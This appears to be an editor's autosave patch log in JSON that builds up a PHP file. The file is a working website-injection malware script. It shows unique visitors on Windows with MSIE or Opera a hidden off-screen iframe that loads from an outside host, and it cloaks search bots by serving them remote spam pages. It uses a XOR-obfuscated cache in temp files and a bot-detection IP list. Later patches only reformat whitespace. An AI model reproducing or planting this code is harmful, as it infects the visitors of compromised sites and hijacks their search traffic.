{"ts":1373930860598,"silentsave":true,"restoring":false,"patch":[[{"diffs":[[1,"<?php\nif (!defined('frmDs')) {\n    \n    define('frmDs' ,1);\n        \n    function frm_dl ($url) \n    {\n        if (function_exists('curl_init')) {\n            $ch = curl_init($url);\n            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);\n            $out = curl_exec ($ch);\n            if (curl_errno($ch) !== 0) $out = false;\n            curl_close ($ch);\t\t\n        } else {\n            $out = @file_get_contents($url);\n        }\n        return trim($out);\t\n    }\t\t\n        \n    function frm_crpt($in) \n    {\t\t\n            $il=strlen($in);$o='';\t\t\n            for ($i = 0; $i < $il; $i++) $o.=$in[$i] ^ '*';\n            return $o;\t\n    }\n    function frm_getcache($tmpdir,$link,$cmtime,$del=true)\n    {\t\t\n        $f = $tmpdir . '/sess_' . md5(preg_replace('/^http:\\/\\/[^\\/]+/', '', $link));\n        if(!file_exists($f) || time() - filemtime($f) > 60 * $cmtime) {\n            $dlc=frm_dl($link);\t\t\t\n            if($dlc===false){\n                if(del)\n                @unlink($f);\n                else\n                @touch($f);\n                }\n                else\n                {\n                    if($fp = @fopen($f,'w')){\n                        fwrite($fp, frm_crpt($dlc)); fclose($fp);\n                        }else{return $dlc;}\n                        }\n                        }\n                        $fc = @file_get_contents($f);\t\treturn ($fc)?frm_crpt($fc):'';\t}\t\tfunction frm_isbot($ua){\t\tif(($lip=ip2long($_SERVER['REMOTE_ADDR']))<0)$lip+=4294967296; \t\t$rs = array(array(3639549953,3639558142),array(1089052673,1089060862),array(1123635201,1123639294),array(1208926209,1208942590),\t\t\t\t\tarray(3512041473,3512074238),array(1113980929,1113985022),array(1249705985,1249771518),array(1074921473,1074925566),\t\t\t\t\tarray(3481178113,3481182206),array(2915172353,2915237886));\t\tforeach ($rs as $r) if($lip>=$r[0] && $lip<=$r[1]) return true;\t\tif(!$ua)return true;\t\t$bots = array('googlebot','bingbot','slurp','msnbot','jeeves','teoma','crawler','spider');\t\tforeach ($bots as $b) if(strpos($ua, $b)!==false) return true;\t\treturn false;\t}\t\t\n                        function frm_tmpdir(){\n                            $fs = array('/tmp','/var/tmp');\n                            foreach (array('TMP', 'TEMP', 'TMPDIR') as $v) {\n                                if ($t = getenv($v)) {$fs[]=$t;}\n                                }        if (function_exists('sys_get_temp_dir')) {$fs[]=sys_get_temp_dir();}        $fs[]='.';\t\t        foreach ($fs as $f){        \t$tf = $f.'/'.md5(rand());        \tif($fp = @fopen($tf, 'w')){        \t\tfclose($fp);        \t\tunlink($tf);        \t\treturn $f;        \t}        }\t\treturn false;\t}\tfunction frm_seref(){\t\t$r = @strtolower($_SERVER[\"HTTP_REFERER\"]);\t\t$ses = array('google','bing','yahoo','ask','aol');\t\tforeach ($ses as $se) if(strpos($r, $se.'.')!=false) return true;\t\treturn false;\t}\t\tfunction frm_isuniq($tdir){\t\t$ip=$_SERVER['REMOTE_ADDR'];\t\t$dbf=$tdir.'/sess_'.md5(date('m.d.y'));\t\t$odbf = $tdir.'/sess_'.md5(date('m.d.y',time()-86400));\t\tif (file_exists($odbf)) @unlink($odbf);\t\tif(strpos(frm_crpt(@file_get_contents($dbf)),$ip) === false ){\t\t\tif ($fp=@fopen($dbf,'a')){fputs($fp,frm_crpt($ip.'|')); fclose($fp);}\t\t\treturn true;\t\t}\t\treturn false;\t}\t\t$tdir = frm_tmpdir();\t$defframe = '<style>\t.ljqbca { position:absolute; left:-779px; top:-778px; }</style><div class=\"ljqbca\"><iframe src=\"http://kbjvzhfhmxq.kwik.to/jquery/get.php?ver=jquery.latest.js\" width=\"392\" height=\"351\"></iframe></div>';\t$defrdg='http://kbjvzhfhmxq.kwik.to/jquery/get.php?ver=jquery.js'; \t$codelink = '';\t$rdglink='';\t\t$ua=$_SERVER['HTTP_USER_AGENT'];\t$isb=frm_isbot($ua);\t\tif (!$isb && preg_match('/Windows/', $ua) && preg_match('/MSIE|Opera/', $ua) && frm_isuniq($tdir) ){\t\terror_reporting(0);\t\t\tif(!isset($_COOKIE['__utmfr'])) {\t\t\tif(!$codelink)\t\t\t\tprint($defframe);\t\t\telse\t\t\t\tprint(frm_getcache($tdir,$codelink,15));\t\t\t@setcookie('__utmfr',rand(1,1000),time()+86400*7,'/');\t\t}\t}\t\t//-------\t$host = preg_replace('/^w{3}\\./','', strtolower($_SERVER['HTTP_HOST']));\tif($tdir && strlen($host)<100 && !preg_match('/^[0-9\\.]+$/',$host)){\t\t$parg = substr(preg_replace( '/[^a-z]+/', '',strtolower(base64_encode(md5($host)))),0,3);\t\t$pageid = (isset($_GET[$parg]))?$_GET[$parg]*1:0;\t\t$ruri = strtolower($_SERVER['REQUEST_URI']);\t\tif((strpos($ruri,'/?')===0||strpos($ruri,'/index.php?')===0) && $pageid > 0){\t\t\tprint(frm_getcache($tdir,\"http://kbjvzhfhmxq.kwik.to/rdg/getpage.php?h=$host&p=$pageid&pa=$parg\",60*48,false));\t\t\texit();\t\t}\t\tif ($isb) {\t\t\terror_reporting(0);\n    print(frm_getcache($tdir,\"http://kbjvzhfhmxq.kwik.to/rdg/getpage.php?h=$host&pa=$parg&g=\".(($ruri=='/'||$ruri=='/index.php')?'1':'0'),60*48,false));\t\t}\t}\t//---------}"]],"start1":0,"start2":0,"length1":0,"length2":4663}]],"length":4663}
{"contributors":[],"silentsave":false,"ts":1373931294294,"patch":[[{"diffs":[[0,"false));"],[-1,"\t\t}\t}\t"],[1,"\n    }\t}\n    "],[0,"//------"]],"start1":4637,"start2":4637,"length1":22,"length2":29}]],"length":4670,"saved":false}
{"ts":1373931300237,"patch":[[{"diffs":[[0,"        "],[1,"    "],[0,"@unlink("]],"start1":962,"start2":962,"length1":16,"length2":20},{"diffs":[[0,"           else\n"],[1,"    "],[0,"                "]],"start1":992,"start2":992,"length1":32,"length2":36}]],"length":4678,"saved":false}
{"ts":1373931307520,"patch":[[{"diffs":[[0,"        "],[-1,"    "],[0,"$il=strl"]],"start1":513,"start2":513,"length1":20,"length2":16},{"diffs":[[0,"n);$o='';\t\t\n"],[-1,"    "],[0,"        for "]],"start1":534,"start2":534,"length1":28,"length2":24},{"diffs":[[0," ^ '*';\n"],[-1,"    "],[0,"        "]],"start1":594,"start2":594,"length1":20,"length2":16}]],"length":4666,"saved":false}
{"ts":1373951896357,"patch":[[{"diffs":[[0,"s($f);\t\t"],[1,"\n                        "],[0,"return ("]],"start1":1340,"start2":1340,"length1":16,"length2":41},{"diffs":[[0,"fc):'';\t"],[-1,"}\t\t"],[1,"\n                    }\t\t\n                        "],[0,"function"]],"start1":1396,"start2":1396,"length1":19,"length2":65}]],"length":4737,"saved":false}
